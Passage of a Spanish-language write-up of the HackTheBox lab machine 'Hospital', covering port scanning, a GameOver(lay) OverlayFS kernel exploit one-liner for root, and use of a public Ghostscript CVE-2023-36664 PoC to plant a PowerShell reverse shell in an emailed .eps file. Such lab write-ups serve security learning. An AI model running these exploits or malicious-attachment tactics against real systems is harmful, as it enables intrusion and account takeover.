____
Hospital es una máquina de dificultad Media en HackTheBox que me pareció especialmente interesante por su arquitectura híbrida: un `Domain Controller Windows` que aloja en su interior una máquina virtual Linux, lo que obliga a mantener dos frentes de ataque en paralelo y encadenar vulnerabilidades de ambos entornos para llegar al objetivo final. La cadena de explotación combina un bypass de subida de ficheros para obtener ejecución remota de comandos en la VM Linux, una escalada de privilegios mediante el kernel exploit `GameOver(lay) (CVE-2023-2640)`, y finalmente una inyección de comandos a través de `GhostScript (CVE-2023-36664)` que nos da acceso al DC Windows. 

![img](assets/hospital/portHosp.png)

El escaneo de puertos con `nmap` revela una superficie de ataque algo compleja. La combinación de `Kerberos (88)`, `LDAP (389/636)`, `SMB (445)` y `RDP (3389)` apuntan a un Domain Controller Windows, confirmado por el hostname `DC.hospital.htb` y el dominio `hospital.htb`.

Sin embargo, hay dos anomalías que llaman la atención de inmediato: el puerto `22` expone `OpenSSH 9.0p1` sobre Ubuntu, no sobre Windows, y el puerto `8080` levanta un `Apache 2.4.55` también sobre Ubuntu, mientras que el `443` corre sobre Win64.

Esto sugiere que dentro del DC Windows existe al menos un contenedor o máquina virtual Linux que expone servicios propios hacia el exterior. Tenemos por tanto dos superficies de ataque diferenciadas:


| Puerto | Servicio | Sistema |
|--------|----------|---------|
| `443` | Webmail (RoundCube) | Windows |
| `8080` | Aplicación web PHP | Linux (contenedor) |
| `22` | SSH | Linux (contenedor) |

### Enumeración de usuarios y SMB

Dado que estamos ante un Domain Controller, intento enumerar usuarios del dominio con `impacket-lookupsid` y recursos SMB con `smbclient`, pero ambos intentos fallan sin credenciales válidas:

```bash
❯ impacket-lookupsid hospital.htb@10.129.229.189
[*] Brute forcing SIDs at 10.129.229.189
[*] StringBinding ncacn_np:10.129.229.189[\pipe\lsarpc]
[-] SMB SessionError: code: 0xc000006d - STATUS_LOGON_FAILURE - The attempted logon is invalid.
```

El error `STATUS_LOGON_FAILURE` indica que el DC `no permite sesiones nulas`, por lo que la enumeración anónima de SIDs está bloqueada. Lo mismo ocurre con `smbclient`, sin credenciales, no hay acceso a recursos compartidos.

De momento el vector Active Directory queda aparcado. Cambio el foco hacia las dos aplicaciones web identificadas en el escaneo: el webmail en `443` y la aplicación PHP en `8080`.

### Shell as root

Realizando una enumeración básica del sistema encuentro nos encontramos con una versión de kernen vulnerable

```bash
www-data@webserver:~$ uname -r
5.19.0-35-generic
```

El kernel `5.19.0-35-generic` es vulnerable a `GameOver(lay)` (`CVE-2023-2640` / `CVE-2023-32629`  ), una vulnerabilidad de escalada de privilegios basada en el mal manejo de `OverlayFS` que permite a un usuario sin privilegios otorgar capabilities a binarios arbitrarios. En el siguiente enlace explican la vulnerabilidad y como realizar la escalada [crowdstrike.com](https://www.crowdstrike.com/en-us/blog/crowdstrike-discovers-new-container-exploit/)

Ejecuto el exploit:

```bash
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;\
mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && \
u/python3 -c 'import os;os.setuid(0);os.system("cp /bin/bash /var/tmp/bash && \
chmod 4755 /var/tmp/bash && /var/tmp/bash -p && \
rm -rf l m u w /var/tmp/bash")'
```

El exploit monta un `OverlayFS` en espacio de usuario, copia `python3` en la capa inferior y le asigna la capability `cap_setuid`. Al activarse el overlay, el binario resultante hereda la capability y permite llamar a `os.setuid(0)`, obteniendo una shell como `root`.

![img](assets/hospital/hosp6.png)

En la bandeja de entrada encontramos un correo de `drbrown@hospital.htb` dirigido a Lucy en el que le solicita que le envíe diseños en formato `.eps` para procesarlos con `GhostScript`.
Esto es un hallazgo crítico: `GhostScript` tiene vulnerabilidades públicas de ejecución remota de comandos, entre ellas `CVE-2023-36664`. La mecánica es clara — si enviamos a `drbrown` un fichero `.eps` malicioso por este webmail, y él lo abre con `GhostScript`, obtendremos ejecución de comandos en el DC Windows con el contexto de su usuario.

![img](assets/hosp/hosp9.png)

Descargo el PoC público de `CVE-2023-36664` y lo uso para generar el `.eps` malicioso con mi reverse shell:

```bash
❯ git clone https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection
❯ python3 CVE_2023_36664_exploit.py -g -p "powershell -e JABjAGwAaQBlAG4Ad..." -x eps
```

El script genera el fichero `malicious.eps` con el payload de PowerShell en `base64` incrustado, listo para ser procesado por `GhostScript`. Me pongo en escucha en mi máquina atacante y envío el fichero como adjunto a `drbrown@hospital.htb` desde el webmail de `drwilliams`.

![img](assets/hospital/hosp10.png)

En el momento en que `drbrown` abre el adjunto, `GhostScript` procesa el `.eps` y ejecuta el payload, enviándonos la conexión. Tenemos shell en el DC Windows como `drbrown`. Una vez dentro enumeramos su directorio encontrando la primera flag y un archivo `ghostsrcipt.bat` que contiene las credenciales en texto plano del usuario `drbrown`

```powershell

└── Documents\

```
